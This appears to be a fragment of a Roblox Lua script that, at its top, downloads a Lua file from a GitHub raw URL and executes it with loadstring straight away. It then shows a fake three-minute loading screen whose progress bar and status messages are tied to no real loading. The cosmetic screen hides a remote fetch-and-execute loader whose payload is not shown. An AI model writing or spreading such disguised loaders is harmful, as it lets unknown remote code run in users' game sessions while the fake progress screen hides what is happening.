-- Start external script immediately
task.spawn(function()
    local success, result = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/vakfq/LOADING/main/script.lua")
    end)
    if success then
        local fn, err = loadstring(result)
        if fn then
            fn()
        else
            warn("Script error:", err)
        end
    else
        warn("Fetch error:", result)
    end
end)

-- Run the progress bar update over 180 seconds
task.spawn(function()
    local totalSteps = 100
    local totalTime = 180
    local delayPerStep = totalTime / totalSteps

    for i = 0, totalSteps do
        percentText.Text = i .. "%"
        
        -- Tween progress bar size
        TweenService:Create(progressBar, TweenInfo.new(0.1), {
            Size = UDim2.new(i / 100, 0, 1, 0)
        }):Play()

        -- Status messages
        if i <= 21 then
            statusText.Text = "Loading assets..."
        elseif i <= 34 then
            statusText.Text = "Loading character..."
        elseif i <= 67 then
            statusText.Text = "Loading map..."
        elseif i < 100 then
            statusText.Text = "Finalizing..."
        else
            statusText.Text = "DONE"
        end

        wait(delayPerStep)
    end

    -- Fade out screen
    for i = 1, 10 do
        local t = i / 10
        background.BackgroundTransparency = t
        loadingText.TextTransparency = t
        statusText.TextTransparency = t
        percentText.TextTransparency = t
        stroke.Transparency = t
        robloxIcon.ImageTransparency = t
        progressBar.BackgroundTransparency = t
        progressBarBg.BackgroundTransparency = t
        creditText.TextTransparency = t
        wait(0.05)
    end

    running = false
    screenGui:Destroy()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
end)
